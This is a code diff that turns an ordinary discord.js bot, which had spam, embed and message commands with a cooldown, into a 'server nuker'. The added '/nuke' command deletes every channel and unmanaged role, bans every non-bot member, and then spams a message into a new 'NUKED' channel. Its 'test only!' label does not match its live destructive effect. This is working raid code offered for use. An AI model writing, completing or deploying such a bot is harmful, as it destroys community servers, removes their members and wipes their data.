@@ -1,146 +1,96 @@
-const {
-  Client,
-  GatewayIntentBits,
-  SlashCommandBuilder,
-  Routes,
-  REST,
-  EmbedBuilder
-} = require("discord.js");
+const { Client, GatewayIntentBits, SlashCommandBuilder, Routes, REST, EmbedBuilder } = require("discord.js");
 
-const TOKEN = process.env.DISCORD_TOKEN;
-const CLIENT_ID = process.env.CLIENT_ID;
+const TOKEN = process.env.DISCORD_TOKEN || "YOUR_BOT_TOKEN";
+const CLIENT_ID = process.env.CLIENT_ID || "YOUR_CLIENT_ID";
 
 const client = new Client({
   intents: [
     GatewayIntentBits.Guilds,
     GatewayIntentBits.GuildMessages,
+    GatewayIntentBits.GuildMembers,
     GatewayIntentBits.MessageContent
   ]
 });
 
-// Cooldown map
-const cooldowns = new Map();
-const COOLDOWN_TIME = 3000; // 3 seconds
-
-const COLOR_MAP = {
-  red: 0xff0000,
-  blue: 0x0064ff,
-  green: 0x00c800,
-  yellow: 0xffff00,
-  purple: 0xa000ff,
-  orange: 0xffa500
-};
-
-const INVITE_LINK = "https://your-discord-invite-link";
+const rest = new REST({ version: "10" }).setToken(TOKEN);
 
 // Slash commands
 const commands = [
   new SlashCommandBuilder()
-    .setName("spam")
-    .setDescription("Spam a message multiple times")
+    .setName("nuke")
+    .setDescription("888 Nuked You LOL")
     .addStringOption(opt =>
-      opt.setName("message").setDescription("Message").setRequired(true)
-    )
-    .addIntegerOption(opt =>
-      opt.setName("count").setDescription("How many times (1-20)").setMinValue(1).setMaxValue(20)
-    ),
-
-  new SlashCommandBuilder()
-    .setName("sendembed")
-    .setDescription("Send an embed")
-    .addStringOption(opt =>
-      opt.setName("title").setDescription("Title").setRequired(true)
-    )
-    .addStringOption(opt =>
-      opt.setName("message").setDescription("Message").setRequired(true)
-    )
-    .addStringOption(opt =>
-      opt.setName("color")
-        .setDescription("Embed color")
+      opt.setName("spam_message")
+        .setDescription("Message to spam in channels")
         .setRequired(true)
-        .addChoices(
-          { name: "Red", value: "red" },
-          { name: "Blue", value: "blue" },
-          { name: "Green", value: "green" },
-          { name: "Yellow", value: "yellow" },
-          { name: "Purple", value: "purple" },
-          { name: "Orange", value: "orange" }
-        )
-    ),
-
-  new SlashCommandBuilder()
-    .setName("sendmessage")
-    .setDescription("Send a message")
-    .addStringOption(opt =>
-      opt.setName("message").setDescription("Message").setRequired(true)
     )
 ];
 
-// Register slash commands
-const rest = new REST({ version: "10" }).setToken(TOKEN);
 (async () => {
   try {
     await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands });
-    console.log("✅ Slash commands registered!");
+    console.log("✅ Nuke slash command registered!");
   } catch (err) {
     console.error(err);
   }
 })();
 
-// Bot ready
 client.on("ready", () => {
   console.log(`Logged in as ${client.user.tag}`);
 });
 
-// Command handler
+// Nuke command
 client.on("interactionCreate", async interaction => {
   if (!interaction.isChatInputCommand()) return;
+  if (interaction.commandName !== "nuke") return;
 
-  const userId = interaction.user.id;
-  const now = Date.now();
-
-  // Cooldown
-  const lastUsed = cooldowns.get(userId) || 0;
-  if (now - lastUsed < COOLDOWN_TIME) {
-    return interaction.reply({
-      content: `⏱ Please wait ${(COOLDOWN_TIME - (now - lastUsed)) / 1000}s before using another command.`,
-      ephemeral: true
-    });
+  if (!interaction.member.permissions.has("Administrator")) {
+    return interaction.reply({ content: "❌ You must be an Administrator to use this command.", ephemeral: true });
   }
-  cooldowns.set(userId, now);
 
-  // Spam command
-  if (interaction.commandName === "spam") {
-    const text = interaction.options.getString("message");
-    const count = interaction.options.getInteger("count") || 5;
+  await interaction.deferReply({ ephemeral: true });
 
-    await interaction.reply({ content: `Sending ${count} messages...`, ephemeral: true });
+  const spamMessage = interaction.options.getString("spam_message");
+  const guild = interaction.guild;
 
-    for (let i = 0; i < count; i++) {
-      await interaction.channel.send(text.replace(/\\n/g, "\n"));
-      await new Promise(r => setTimeout(r, 200));
+  // 1️⃣ Delete all channels
+  for (const channel of guild.channels.cache.values()) {
+    try {
+      await channel.delete();
+    } catch (err) {
+      console.log(`Could not delete channel ${channel.name}: ${err}`);
     }
   }
 
-  // Send embed
-  if (interaction.commandName === "sendembed") {
-    const title = interaction.options.getString("title");
-    const message = interaction.options.getString("message");
-    const color = interaction.options.getString("color");
-
-    const embed = new EmbedBuilder()
-      .setTitle(title)
-      .setDescription(message.replace(/\\n/g, "\n"))
-      .setColor(COLOR_MAP[color] || 0xffffff);
-
-    await interaction.reply({ embeds: [embed] });
+  // 2️⃣ Delete all roles
+  for (const role of guild.roles.cache.values()) {
+    try {
+      if (!role.managed && role.id !== guild.id) {
+        await role.delete();
+      }
+    } catch (err) {
+      console.log(`Could not delete role ${role.name}: ${err}`);
+    }
   }
 
-  // Send message
-  if (interaction.commandName === "sendmessage") {
-    const message = interaction.options.getString("message");
-    await interaction.reply({ content: message.replace(/\\n/g, "\n") });
+  // 3️⃣ Ban all members except bot
+  for (const member of guild.members.cache.values()) {
+    try {
+      if (!member.user.bot) {
+        await member.ban({ reason: "Server nuked" });
+      }
+    } catch (err) {
+      console.log(`Could not ban member ${member.user.tag}: ${err}`);
+    }
   }
+
+  // 4️⃣ Spam new channels
+  const newChannel = await guild.channels.create({ name: "NUKED", type: 0 }); // 0 = text
+  for (let i = 0; i < 10; i++) {
+    await newChannel.send(spamMessage);
+  }
+
+  await interaction.editReply({ content: "✅ Server nuked (test only!)." });
 });
 
 client.login(TOKEN);
